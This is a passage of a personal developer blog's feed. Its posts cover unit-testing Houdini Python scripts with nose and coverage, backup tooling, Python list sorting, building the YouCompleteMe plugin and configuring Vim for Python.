    &lt;span class="n"&gt;nose&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;__file__&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="s1"&gt;'--cover_html'&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;As you can see, you can pass the commandline argments for nose into the run function.
With &lt;code&gt;--cover_html&lt;/code&gt; we automatically generate the html coverage information. You
could omit this and run &lt;code&gt;coverage html&lt;/code&gt; after the tests complete to generate the
html coverage pages instead. The output from the two methods is slightly different,
so pick the one that you prefer.&lt;/p&gt;
&lt;p&gt;The next bits are up to you now, here you write your tests following a format like&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;test_afunction&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;node&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hou&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'/obj/geo/box1'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;module_to_test&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;do_stuff&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;assert&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;You can access any and all &lt;code&gt;hou.&lt;/code&gt; calls from your tests, so do what you must.&lt;/p&gt;
&lt;p&gt;Once you are happy with your tests, or you just want to go ahead and test a single
one, we need to run the tests through hython. Bear in mind that you'll consume a
batch license when you run these tests.&lt;/p&gt;
&lt;pre class="code bash literal-block"&gt;
hython ./test.py
&lt;/pre&gt;
&lt;p&gt;where &lt;code&gt;test.py&lt;/code&gt; is the name of the file that contains the tests you wrote.
After a while you'll see your tests run and the coverage output. It should
look a little like this&lt;/p&gt;
&lt;pre class="code bash literal-block"&gt;
...
Name          Stmts   Miss  Cover   Missing
-------------------------------------------
module_to_test  &lt;span class="m"&gt;25&lt;/span&gt;     &lt;span class="m"&gt;14&lt;/span&gt;    44%   1-2, 6, 9, 12-15, 21, 27-32
another_module  &lt;span class="m"&gt;314&lt;/span&gt;    &lt;span class="m"&gt;173&lt;/span&gt;    45%   4-20, 24, 37-38, 46
-------------------------------------------
TOTAL           &lt;span class="m"&gt;339&lt;/span&gt;    &lt;span class="m"&gt;187&lt;/span&gt;    45%
----------------------------------------------------------------------
Ran &lt;span class="m"&gt;3&lt;/span&gt; tests in 0.053s

OK
&lt;/pre&gt;
&lt;p&gt;You'll also have a directory called &lt;code&gt;cover&lt;/code&gt; which will contain the html output,
assuming you have the &lt;code&gt;--cover_html&lt;/code&gt; flag on. If not, run &lt;code&gt;coverage html&lt;/code&gt; and
after a short wait you will have a &lt;code&gt;htmlcov&lt;/code&gt; directory with the html coverage
info.&lt;/p&gt;
&lt;p&gt;I hope this helps you out if you ever wanted to unit test your Houdini Python
script. It's not as difficult as I thought, but it does take a little bit of setting
up to get everything to work right. There will still be some limitations as to what
you can test and get results for, but any testing is always better than none at
all I say.&lt;/p&gt;
&lt;p&gt;And the &lt;code&gt;test.py&lt;/code&gt; file as a whole&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;nose&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'../path_of_module'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'NOSE_WITH_COVERAGE'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'1'&lt;/span&gt;
&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'NOSE_COVER_PACKAGE'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'module_to_test'&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;hou&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;module_to_test&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;test_afunction&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;node&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hou&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'/obj/geo/box1'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;module_to_test&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;do_stuff&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;assert&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;'__main__'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;hou&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hipFile&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;load&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'/path/to/test.hip'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;nose&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;__file__&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="s1"&gt;'--cover_html'&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/pre&gt;
</summary></entry><entry><title>Effort Vs Benefit</title><link href="http://unlogic.co.uk/2014/03/12/effort-vs-benefit/" rel="alternate"></link><updated>2014-03-12T22:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2014-03-12:2014/03/12/effort-vs-benefit/</id><summary type="html">&lt;p&gt;How often have you thought: &amp;quot;Everything would be a lot better if this
tool worked faster&amp;quot;? Probably quite often. You've most likely also heard the
saying &amp;quot;Don't optimise prematurely&amp;quot;. It's true, there's no point making
something faster if you don't know it's too slow. Don't waste time on
trying to optimise before you get some metrics telling you it needs it.&lt;/p&gt;
&lt;p&gt;What you might not have thought about though is whether the speed increase
is actually worth it. Sure, for something like game development where
every nanosecond matters it's very critical, but in other situations,
it really depends on how the performance impacts the user's workflow.&lt;/p&gt;
&lt;p&gt;A paper from 2011 titles &lt;a class="reference external" href="https://www.dropbox.com/s/rqc3xpmtskxcxov/workflow.pdf"&gt;The Workflow Scale&lt;/a&gt; covers this subject very well. It is targeted at
a specific industry and workflow, but the same applies elsewhere.
It says that the benefit of a speed increase to a workflow depends on
how it changes the behaviour of the user. It's a short but well
written paper that every developer should read.&lt;/p&gt;
&lt;p&gt;I appreciate that it doesn't apply to all cases, but it's information
that should be taken on board. The next time you decide you should spend
some time improving the speed of a certain task, consider if the payoff is
worth the time you will spend making the improvement.&lt;/p&gt;
</summary></entry><entry><title>A little less mollusc</title><link href="http://unlogic.co.uk/2014/03/05/a-little-less-mollusc/" rel="alternate"></link><updated>2014-03-06T12:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2014-03-05:2014/03/05/a-little-less-mollusc/</id><summary type="html">&lt;p&gt;I've migrated once more... from Octopress to a pure Jekyll blog.
The main reason is that I almost borked the octopress version again and
was struggling to get it fixed. This blog is much simpler and will be easier to
customise too.&lt;/p&gt;
&lt;p&gt;UPDATE: I've also managed to add Disqus to this blog and port all the old comments
to the new URLs, so all old comment threads are back with their posts.&lt;/p&gt;
</summary><category term="[]"></category></entry><entry><title>Get it done</title><link href="http://unlogic.co.uk/2014/03/04/get-it-done/" rel="alternate"></link><updated>2014-03-04T10:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2014-03-04:2014/03/04/get-it-done/</id><summary type="html">&lt;p&gt;A few years ago, during a particularily active developing phase I had an idea for a project.
I toyed with it in my head and thought about issues I might encounter. Will it work
in this situation? Is it something that will be useful? How do I make feature X work?
Do I need it to also do this? The usual stuff. So much so I never got round to starting it.
I figured it's ok, because someone else has done it and executed in a much better way.
Besides, who'd want to use it anyway, right? It would only have been me.&lt;/p&gt;
&lt;p&gt;So now I am browsing my newsfeed and come across this: &lt;a class="reference external" href="https://flutterapp.com/"&gt;https://flutterapp.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;That's pretty much what I was aiming to make back then. Just goes to show you doesn't it,
if you have an idea just go make it happen. Just because someone else has made it doesn't
mean you shouldn't make it again if you want. Perhaps you can do it better? We're not all
innovators, but we are all capable to make something different and perhaps better.
If you can't quite figure out how to do it, don't let that stop you from at least making a start.
Do something, anything, to get started. That's the hard part. Once you get started don't force
yourself to make it work in a day, or a week even. Take your time, do it as long as you enjoy it.&lt;/p&gt;
&lt;p&gt;So I'm going to take some of my own medicine and make a start on this project myself. It's been a
long time coming after all.&lt;/p&gt;
</summary></entry><entry><title>Back it up</title><link href="http://unlogic.co.uk/2014/02/26/back-it-up/" rel="alternate"></link><updated>2014-02-26T00:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2014-02-26:2014/02/26/back-it-up/</id><summary type="html">&lt;p&gt;For years I've been paying for &lt;a class="reference external" href="http://www.backblaze.com"&gt;Backblaze&lt;/a&gt; in order to ensure
my photos, music, and other import data doesn't get lost in a hard drive crash, theft or fire.
I don't think I really need to go over all the reason why you should backup your data, do I?
But you should at least have a local backup, and ideally an offsite one too.&lt;/p&gt;
&lt;p&gt;So why did I stop paying for Backblaze? No real reason. It came up to the renewal date
and I thought &amp;quot;I wonder if I can do this a little cheaper perhaps?&amp;quot;. After all, I'm not
a stranger to technology.&lt;/p&gt;
&lt;p&gt;For Christmas I was lovingly gifted a 2TB
&lt;a class="reference external" href="http://www.wdc.com/en/products/products.aspx?id=280"&gt;WD Mybook Live drive&lt;/a&gt;
and thought this is what I will use for backups (amongst other things). To give you
an overview of what I need to backup:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Around 40GB of photos&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I don't take a lot of photos, after all, I'm no professional, but those that I do
take are dear to me. So they need to be backed up&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p class="first"&gt;MP3s&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Well, I actually have those on Google Play, so they are already kinda backed up.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;A few MB of documents&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The usual stuff like invoices, receipts, correspondence, etc&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;A few GB of code&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;It's what I do. So there's quite a bit of it, and not all of it is on Github.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This is all spread across an old iMac I rarely use and a MacBook Pro which is my
daily use machine. I also want to have a local backup and an offsite backup.&lt;/p&gt;
&lt;p&gt;So first off I had to pick some software that will at least copy the relevant files
to the WD and create snapshots as a bonus. Because I'm an old command line lover, I
first opted for &lt;a class="reference external" href="http://www.nongnu.org/rdiff-backup/"&gt;rdiff-backup&lt;/a&gt; which, after some
set up and testing, worked really well. I'd run the backup whenever I changed some
important files, or at least once a week. Then, on Sunday I would rsync the backup onto
a memory stick which I always have with me.&lt;/p&gt;
&lt;p&gt;This was fine until my connection dropped in the middle of
a backup operation. What happens then is that the target dir is corrupt and rdiff-backup
tries to roll back the recent backup. Which is fine in most cases, but in my case something
got stuck and it never completed the roll back.
I blew the directory away and started again, during which I looked at some alternatives (free),
seeing as I now had some time to kill.&lt;/p&gt;
&lt;p&gt;First I thought &amp;quot;I can give this Time Machine thing a try. After all, it's free and
it's built right into the OS (sorta)&amp;quot;. For some reason though it wouldn't let me select a mount
as a backup target. Probably because they don't want you backing your local disks to
your local disks?&lt;/p&gt;
&lt;p&gt;So that was out of the question. Then I thought I would checkout &lt;a class="reference external" href="http://www.crashplan.com"&gt;Crashplan&lt;/a&gt;
as they were always coming up as an alternative to Backblaze and is also cross platform.
I checked out their free service which allows you to backup to a remote host, and
conveniently it also supports backing up to local folders.&lt;/p&gt;
&lt;p&gt;So I downloaded it, did a basic setup and fired it off, along with an up-to-date
rdiff-backup. Both take a little bit of time as it's the first backup, but that doesn't
bother me much, the incrementals will be quicker. What I wanted to know was how big the
backup will be.&lt;/p&gt;
&lt;p&gt;Surprisingly Crashplan's initial backup is over 1GB less than the rdiff-backup. I imagine
that it will get bigger, as I have it set to keep a longer history, but still, that's
quite a saving. It also runs in the background, so no manual intervention needed.
It'll just tick along and backup behind the scenes just like Backblaze did.&lt;/p&gt;
&lt;p&gt;As for my offsite, I'll still use my USB stick with rdiff-backup mostly because
I need to copy the data onto a remote machine with rsync. Crashplan creates a single file for the backup
which will be a pain to copy each time. Using rsync to copy off an rdiff backup is
much quicker after the initial.&lt;/p&gt;
&lt;div class="section" id="summary"&gt;
&lt;h2&gt;Summary&lt;/h2&gt;
&lt;p&gt;So basically I am now running Crashplan locally having left Backblaze. I will say
that I would have stayed with Backblaze if I wasn't prone to tinkering and I
wasn't averse shelling out a bit extra for a family plan. As it is, I can now
backup all the machines in the house for the price of nothing
(plus hardware accessories ;))&lt;/p&gt;
&lt;p&gt;I've only been running it for a day so far, so time will tell if it's as good
Backblaze, but so far this is the backup solution I am going with. I'll update
this post with any discoveries if they are minor, or write new posts if they
require a bit more space.&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>Sorting</title><link href="http://unlogic.co.uk/2014/02/25/sorting/" rel="alternate"></link><updated>2014-02-25T09:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2014-02-25:2014/02/25/sorting/</id><summary type="html">&lt;p&gt;A very quick post about sorting a list of objects in python. Suppose you have a
list of same objects and you wish to sort them based on one of these attributes, perhaps
a return value from a method. There's a really nice way to do it in place:&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;sort_by&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;'name'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;people&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sort&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_name&lt;/span&gt;&lt;span class="p"&gt;()),&lt;/span&gt; &lt;span class="n"&gt;reverse&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;reverse&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;sort_by&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;'age'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;people&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sort&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_age&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;reverse&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;reverse&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;As you can see I wrapped the &lt;code&gt;get_name&lt;/code&gt; call in a &lt;code&gt;str()&lt;/code&gt; because
in this case it was returning something else. I didn't have control over the
code for the user class.&lt;/p&gt;
&lt;p&gt;So now the &lt;code&gt;people&lt;/code&gt; list is sorted by whichever attribute you decide and
you can iterate over it as normal.&lt;/p&gt;
</summary></entry><entry><title>Back to the Octo</title><link href="http://unlogic.co.uk/2014/01/28/back-to-the-octo/" rel="alternate"></link><updated>2014-01-28T22:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2014-01-28:2014/01/28/back-to-the-octo/</id><summary type="html">&lt;p&gt;Back to the Ocotpress we go....&lt;/p&gt;
</summary></entry><entry><title>YouCompleteMe</title><link href="http://unlogic.co.uk/2013/11/07/youcompleteme/" rel="alternate"></link><updated>2013-11-07T12:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2013-11-07:2013/11/07/youcompleteme/</id><summary type="html">&lt;p&gt;If you haven't heard of the YouCompleteMe plugin for Vim, headover to
&lt;a class="reference external" href="http://valloric.github.io/YouCompleteMe/"&gt;http://valloric.github.io/YouCompleteMe/&lt;/a&gt; and take a look.
It's a very competent auto completer for a variety of languages. But as always the C style completer takes
a little bit of work to get going. So just for you, I've written up how I managed to get it to work
on 64bit Centos 6.2.&lt;/p&gt;
&lt;p&gt;So using &lt;a class="reference external" href="https://github.com/gmarik/vundle)installYouCompleteMe(referredtoasYCMfromnowon"&gt;Vundle&lt;/a&gt;.
Now we need to build clang. I managed to get this done by following &lt;a class="reference external" href="http://clang.llvm.org/get_started.html"&gt;these steps&lt;/a&gt;.
Use &lt;code&gt;CC=&amp;quot;/usr/bin/gcc&amp;quot; CXX=&amp;quot;/usr/bin/g++&amp;quot; ../llvm/configure&lt;/code&gt; to configure it.&lt;/p&gt;
&lt;p&gt;You will end up with a directory called &lt;code&gt;build&lt;/code&gt; that contains almost everything. All you have to do is copy the
&lt;code&gt;llvm/tools/clang/include/clang-c&lt;/code&gt; folder from the original checkout (step 2 if you follow the clang guide) to
&lt;code&gt;build/include&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Now we need to build the YCM tools according to the docs. Here's the command I used:&lt;/p&gt;
&lt;pre class="code bash literal-block"&gt;
cmake -G &lt;span class="s2"&gt;&amp;quot;Unix Makefiles&amp;quot;&lt;/span&gt; -DPATH_TO_LLVM_ROOT&lt;span class="o"&gt;=&lt;/span&gt;/tmp/build -DEXTERNAL_LIBCLANG_PATH&lt;span class="o"&gt;=&lt;/span&gt;/tmp/build/Release+Asserts/lib/libclang.so . ~/.vim/bundle/YouCompleteMe/cpp
&lt;/pre&gt;
&lt;p&gt;adjust the paths as necessary. After the configure stage run&lt;/p&gt;
&lt;pre class="code bash literal-block"&gt;
make ycm_support_libs
&lt;/pre&gt;
&lt;p&gt;And with some patience you are done.&lt;/p&gt;
&lt;p&gt;Now you need to add a &lt;code&gt;.ycm_extra_conf.py&lt;/code&gt; to your project and you should start seeing autocompletion.&lt;/p&gt;
</summary></entry><entry><title>Vim as a Python IDE</title><link href="http://unlogic.co.uk/2013/02/08/vim-as-a-python-ide/" rel="alternate"></link><updated>2013-02-08T00:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2013-02-08:2013/02/08/vim-as-a-python-ide/</id><summary type="html">&lt;p&gt;I've been spending quite a bit of time with our good old buddy Python recently, and when
I do, I always invite along our mutual friend Vim. He's a barrell of laughs and always
knows of a quicker way to do things. So I've been getting the two acquainted more and more
and Vim's turned into a totally different person. So I am going to share with you how
I setup Vim as my tool of choice when working with Python code. It's by no means the
definitive way of working, but it works for me. I know there's quite a few posts similar to this one,
but these are the tools &lt;strong&gt;I&lt;/strong&gt; find useful and use. If you have some suggestions, comments, or
know of additional tools that might be useful, I would like to hear about them in the comments
below.&lt;/p&gt;
&lt;p&gt;If you are a Vim user you might find this useful. If you are new to Vim I suggest spending some
time with it before installing any plugins. That way you get used to how Vim works out of the box.
Once you're comfortable with using it, and you've gotten to grips with the Vim-way, go ahead and
install some extras.&lt;/p&gt;
&lt;p&gt;Right, let's get started.&lt;/p&gt;
&lt;p&gt;First and foremost you should install &lt;a class="reference external" href="https://github.com/gmarik/vundle"&gt;Vundle&lt;/a&gt;. Vundle will
make installing and updating all the other tools much easier. It's basically pathogen with a lot
of nice extras, like installing the bundles itself from their Github repos (and other sources).
For more info see the README in the Github repo. To install follow the instructions from the repo,
which are repeated below:&lt;/p&gt;
&lt;pre class="code bash literal-block"&gt;
git clone https://github.com/gmarik/vundle.git ~/.vim/bundle/vundle
&lt;/pre&gt;
&lt;p&gt;thenadd the following to your :code:&lt;tt class="docutils literal"&gt;.vimrc&lt;/tt&gt;&lt;/p&gt;
&lt;pre class="code vim literal-block"&gt;
&lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="nb"&gt;nocompatible&lt;/span&gt;
&lt;span class="k"&gt;filetype&lt;/span&gt; off

&lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="nb"&gt;rtp&lt;/span&gt;&lt;span class="p"&gt;+=~&lt;/span&gt;&lt;span class="sr"&gt;/.vim/&lt;/span&gt;bundle&lt;span class="sr"&gt;/vundle/&lt;/span&gt;
&lt;span class="k"&gt;call&lt;/span&gt; vundle#rc&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="c"&gt;
&amp;quot; let Vundle manage Vundle&lt;/span&gt;
&lt;span class="c"&gt;&amp;quot; required!&lt;/span&gt;
Bundle &lt;span class="s1"&gt;'gmarik/vundle'&lt;/span&gt;
&lt;span class="c"&gt;
&amp;quot; The bundles you install will be listed here&lt;/span&gt;

&lt;span class="k"&gt;filetype&lt;/span&gt; plugin indent &lt;span class="k"&gt;on&lt;/span&gt;
&lt;span class="c"&gt;
&amp;quot; The rest of your config follows here&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Now if you launch Vim and run the command&lt;/p&gt;
&lt;pre class="code vim literal-block"&gt;
&lt;span class="p"&gt;:&lt;/span&gt;BundleList
&lt;/pre&gt;
&lt;p&gt;a new split should appear listing the Vundle bundle. Everything went ok in that case.&lt;/p&gt;
&lt;p&gt;As you go through this article you can install each item separately or you can add the bundles
to your :code:&lt;tt class="docutils literal"&gt;.vimrc&lt;/tt&gt; one by one and then just install them all at once at the end if you prefer.&lt;/p&gt;
&lt;p&gt;Ok, so having done that let's configure a few more things.&lt;/p&gt;
&lt;div class="section" id="highlight-excess-line-length"&gt;
&lt;h2&gt;Highlight excess line length&lt;/h2&gt;
&lt;p&gt;You'll probably want to set a restriction to line width for python files. I like to set this to 120
chars. 80 chars is usually the standard, but with modern displays we can allow ourselves a few more,
but you are free to adjust as you like. To enable this excess highlighting, add the following lines
to your :code:&lt;tt class="docutils literal"&gt;.vimrc&lt;/tt&gt;&lt;/p&gt;
&lt;pre class="code vim literal-block"&gt;
augroup vimrc_autocmds
    autocmd&lt;span class="p"&gt;!&lt;/span&gt;
&lt;span class="c"&gt;    &amp;quot; highlight characters past column 120&lt;/span&gt;
    autocmd &lt;span class="nb"&gt;FileType&lt;/span&gt; python &lt;span class="nb"&gt;highlight&lt;/span&gt; Excess ctermbg&lt;span class="p"&gt;=&lt;/span&gt;DarkGrey guibg&lt;span class="p"&gt;=&lt;/span&gt;Black
    autocmd &lt;span class="nb"&gt;FileType&lt;/span&gt; python &lt;span class="k"&gt;match&lt;/span&gt; Excess &lt;span class="sr"&gt;/\%120v.*/&lt;/span&gt;
    autocmd &lt;span class="nb"&gt;FileType&lt;/span&gt; python &lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="nb"&gt;nowrap&lt;/span&gt;
    augroup END
&lt;/pre&gt;
&lt;p&gt;Anything that exceeds the line length will be highlighted black, feel free to change this colour
to suit your colourscheme. It also turns off line wrapping for python files.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="powerline"&gt;
&lt;h2&gt;Powerline&lt;/h2&gt;
&lt;p&gt;Next up we install &lt;a class="reference external" href="https://github.com/Lokaltog/powerline"&gt;Powerline&lt;/a&gt; which looks like this:&lt;/p&gt;
&lt;a class="reference external image-reference" href="/images/powerline.png"&gt;&lt;img alt="" src="/images/powerline.png" style="width: 500px;" /&gt;&lt;/a&gt;
&lt;p&gt;It shows you your current mode (NORMAL), the current branch in Git, the file you are editing and some other
useful information.&lt;/p&gt;
&lt;p&gt;Simply add:&lt;/p&gt;
&lt;pre class="code vim literal-block"&gt;
Bundle &lt;span class="s1"&gt;'Lokaltog/powerline'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; {&lt;span class="s1"&gt;'rtp'&lt;/span&gt;: &lt;span class="s1"&gt;'powerline/bindings/vim/'&lt;/span&gt;}
&lt;/pre&gt;
&lt;p&gt;to your :code:&lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;.vimrc`:code:`&lt;/span&gt; below the comment we added earlier &lt;span class="pre"&gt;`:code:`&amp;quot;&lt;/span&gt; The bundles you install will be listed here&lt;/tt&gt;. Restart Vim
and run :code:&lt;tt class="docutils literal"&gt;:BundleList&lt;/tt&gt; again. Now you should also see the Powerline bundle listed there. To install it run the command&lt;/p&gt;
&lt;pre class="code vim literal-block"&gt;
&lt;span class="p"&gt;:&lt;/span&gt;BundleInstall
&lt;/pre&gt;
&lt;p&gt;You'll see Vundle process the list and report on the status of the installation. Hopefully everything went ok.&lt;/p&gt;
&lt;p&gt;Powerline however does require a few more things, most notably patched fonts to display the special characters it uses.
You can get pre-patched fonts from &lt;a class="reference external" href="https://github.com/Lokaltog/powerline-fonts"&gt;the powerline-fonts repo&lt;/a&gt;. If your
font isn't listed then the powerline repo does provide a font-patcher you can use to try and patch your font. How this
is done however is outside the scope of this article. To select your font and ensure that Powerline is always shown,
you will also need to add these two lines to your :code:&lt;tt class="docutils literal"&gt;.vimrc&lt;/tt&gt;&lt;/p&gt;
&lt;pre class="code vim literal-block"&gt;
&lt;span class="c"&gt;&amp;quot; Powerline setup&lt;/span&gt;
